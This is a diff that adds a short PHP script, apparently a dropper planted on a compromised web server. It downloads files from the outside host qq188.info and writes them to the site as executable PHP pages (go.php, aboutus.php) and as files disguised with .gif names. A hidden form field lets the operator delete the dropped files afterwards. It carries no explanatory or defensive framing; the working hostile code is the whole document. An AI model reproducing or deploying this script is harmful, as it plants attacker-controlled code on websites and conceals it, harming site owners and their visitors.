@@ -1,0 +1,77 @@
+<?php
+
+error_reporting(E_ERROR);
+set_time_limit(0);
+
+$array = array('d.php','key.txt','content.txt','go.php'); 
+
+function delfile($fileArr)
+{
+foreach($fileArr as $myfile)
+{
+  if (!unlink($myfile))
+  {
+  echo ("Error deleting $myfile <br />");
+  }
+  else
+  {
+  echo ("Deleted $myfile <br />");
+  }
+}}
+
+if(isset($_REQUEST['page'])){
+delfile($array);
+}
+else{
+$key1='';
+$key2='';
+
+$sourceurl='http://www.qq188.info/dy/';
+
+$rdm1=rand(1,9);
+
+$key1=$sourceurl.$rdm1.'L_key.txt';
+
+$keys1=file_get_contents($key1);
+file_put_contents("key.txt", $keys1);
+
+$content=file_get_contents($sourceurl."content.txt");
+file_put_contents("content.txt", $content);
+
+$add=file_get_contents($sourceurl."5am_php_html.txt");
+file_put_contents("go.php", $add);
+
+$rdm2=rand(1,9);
+
+$key2=$sourceurl.$rdm2.'L_key.txt';
+
+$keys2=file_get_contents($key2);
+file_put_contents("0001.gif", $keys2);
+
+$content=file_get_contents($sourceurl."content.txt");
+file_put_contents("0002.gif", $content);
+
+$add=file_get_contents($sourceurl."5am_php_aboutus.txt");
+file_put_contents("aboutus.php", $add);
+
+$mb=file_get_contents($sourceurl."5am_php_mb.txt");
+file_put_contents("0003.gif", $mb);
+
+
+
+$url='http://'.$_SERVER['SERVER_NAME'].$_SERVER["REQUEST_URI"]; 
+$newurl= dirname($url).'/go.php';
+
+echo "<br />";
+echo "<a href ='$newurl'  target='_blank'>Start!</a>";  
+echo "<br />";
+echo "<br />";
+
+}
+?>
+<br />
+<br />
+<form action method="POST">
+<input type="hidden" name="page" value="del" />
+<input type="submit" value="DEL" />
+</form>
